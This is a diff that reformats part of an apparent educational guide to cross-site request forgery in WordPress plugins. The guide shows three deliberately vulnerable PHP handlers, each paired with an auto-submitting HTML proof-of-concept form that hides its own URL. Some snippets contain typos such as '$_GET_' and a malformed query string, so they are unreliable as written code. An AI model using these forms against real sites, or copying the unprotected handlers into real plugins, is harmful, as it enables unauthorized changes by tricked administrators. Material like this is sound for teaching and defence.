@@ -20,29 +20,30 @@ Example of vulnerable code :
 add_action("init", "check_if_update");
 
 function check_if_update(){
-  if(isset($_GET["update"])){
-    if(current_user_can("manage_options")){
-      update_option("user_data", sanitize_text_field($_GET_["data"]));
-    }
-  }
+    if(isset($_GET["update"])){
+        if(current_user_can("manage_options")){
+            update_option("user_data", sanitize_text_field($_GET_["data"]));
+        }
+    }
 }
 ```
 
 To exploit this, unauthenticated users just need to craft and serve a malicious HTML file and trick privileged users into visiting the HTML file to do the sensitive actions.
 
+
 ```html
 <html>
- <body>
-  <form action="<WORDPRESS_BASE_URL>" method="POST">
-   <input type="hidden" name="update" value="1" />
-   <input type="hidden" name="data" value="test" />
-   <input type="submit" value="Submit request" />
-  </form>
-  <script>
-   history.pushState('', '', '/');
-   document.forms[0].submit();
-  </script>
- </body>
+  <body>
+    <form action="<WORDPRESS_BASE_URL>" method="POST">
+      <input type="hidden" name="update" value="1" />
+      <input type="hidden" name="data" value="test" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
 </html>
 ```
 
@@ -56,29 +57,27 @@ Example of vulnerable code :
 add_action("admin_init", "delete_admin_menu");
 
 function delete_admin_menu(){
-  if(isset($_POST_["delete"])){
-    if(current_user_can("manage_options")){
-      delete_option("custom_admin_menu");
-    }
-
-  }
+    if(isset($_POST_["delete"])){
+        if(current_user_can("manage_options")){
+            delete_option("custom_admin_menu");
+        }
+    }
 }
-```
 
 In order to exploit this, unauthenticated users just need to craft and serve a malicious HTML file and trick privileged users into visiting the HTML file to do the sensitive actions.
 
 ```html
 <html>
- <body>
-  <form action="<WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=heartbeat" method="POST">
-   <input type="hidden" name="delete" value="1" />
-   <input type="submit" value="Submit request" />
-  </form>
-  <script>
-   history.pushState('', '', '/');
-   document.forms[0].submit();
-  </script>
- </body>
+  <body>
+    <form action="<WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=heartbeat" method="POST">
+      <input type="hidden" name="delete" value="1" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
 </html>
 ```
 
@@ -92,10 +91,10 @@ Example of vulnerable code :
 add_action("wp_ajax_update_post_data", "update_post_data");
 
 function update_post_data(){
-  if(isset($_POST_["update"])){
-    $post_id = get_post($_GET["id"]);
-    update_post_meta($post_id, "data", sanitize_text_field($_POST["data"]));
-  }
+    if(isset($_POST_["update"])){
+        $post_id = get_post($_GET["id"]);
+        update_post_meta($post_id, "data", sanitize_text_field($_POST["data"]));
+    }
 }
 ```
 
@@ -103,16 +102,16 @@ To exploit this, unauthenticated users just need to craft and serve a malicious 
 
 ```html
 <html>
- <body>
-  <form action="<WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=update_post_data?id=1" method="POST">
-   <input type="hidden" name="update" value="1" />
-   <input type="hidden" name="data" value="test" />
-   <input type="submit" value="Submit request" />
-  </form>
-  <script>
-   history.pushState('', '', '/');
-   document.forms[0].submit();
-  </script>
- </body>
+  <body>
+    <form action="<WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=update_post_data?id=1" method="POST">
+      <input type="hidden" name="update" value="1" />
+      <input type="hidden" name="data" value="test" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
 </html>
 ```
